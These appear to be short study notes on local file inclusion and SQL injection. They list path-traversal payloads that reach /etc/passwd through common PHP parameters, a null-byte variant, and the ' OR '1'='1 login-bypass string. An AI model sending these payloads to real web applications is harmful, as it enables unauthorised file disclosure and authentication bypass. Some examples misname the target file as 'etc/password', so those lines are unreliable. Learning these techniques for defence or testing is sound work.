
# Local file inclusion

web application vulnerability that allows an attacker to access files stored on the server

* example - example.com/index.php?page=etc/password

* You can move up directories with ../../../../
* So our example would change too - example - example.com/index.php?page=./../../../etc/password

* .. = parent directory
* / = directory separator

* %00 = is a null byte, a special character that tells a computer, Stop reading here.
* example.com/index.php?page=./../../../etc/password%00

* F-P-I-T-V-L
  * file - xample.com/index.php?file=../../../../etc/passwd
  * page - example.com/index.php?page=../../../../etc/passwd
  * include - example.com/index.php?include=../../../../etc/passwd
  * template - example.com/index.php?template=../../../../etc/passwd
  * view - example.com/index.php?view=../../../../etc/passwd
  * lang - example.com/index.php?lang=../../../../etc/passwd


Side Note:
LFI is less common in modern applications due to improved security practices, but it still appears in older systems.

------------------------------------------------------------------------------------------
SQL injection
------------------------------------------------------------------------------------------
database vulnerability that allows an attacker to manipulate queries by injecting malicious SQL code into input fields
this exploit occurs when user inputs are not properly validated or sanitized.

examples:
' OR '1'='1

Possible Vulnerable Inputs -
Username, password, cookies, search bar, form fields, 


Side Note:
SQLMap is a powerful penetration  tool used for detecting and exploiting sql vulnerabilities in web applications.


